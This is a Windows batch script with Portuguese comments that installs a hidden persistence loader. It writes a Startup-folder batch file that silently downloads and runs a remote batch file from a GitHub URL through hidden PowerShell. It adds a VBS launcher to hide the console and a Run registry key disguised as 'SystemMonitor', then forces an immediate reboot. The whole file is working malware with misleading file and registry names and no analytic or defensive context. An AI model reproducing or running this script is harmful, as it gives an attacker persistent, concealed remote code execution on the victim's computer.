@echo off
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Criar o arquivo de inicialização
(
echo @echo off
echo set "url=https://raw.githubusercontent.com/lcmandrikion-hash/LZX/main/LXZ.bat"
echo set "arquivo=%%TEMP%%\LZX.bat"
echo powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%%url%%' -OutFile '%%arquivo%%'"
echo start /B "" "%%arquivo%%"
echo exit
) > "%startup%\SystemData.bat"

:: Criar atalho VBS para executar sem console
(
echo Set WshShell = CreateObject("WScript.Shell")
echo WshShell.Run chr(34) ^& "%startup%\SystemData.bat" ^& Chr(34), 0, False
echo Set WshShell = Nothing
) > "%startup%\SystemData.vbs"

:: Adicionar ao registro para iniciar silenciosamente
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemMonitor" /t REG_SZ /d "wscript.exe \"%startup%\SystemData.vbs\"" /f

shutdown /r /t 0
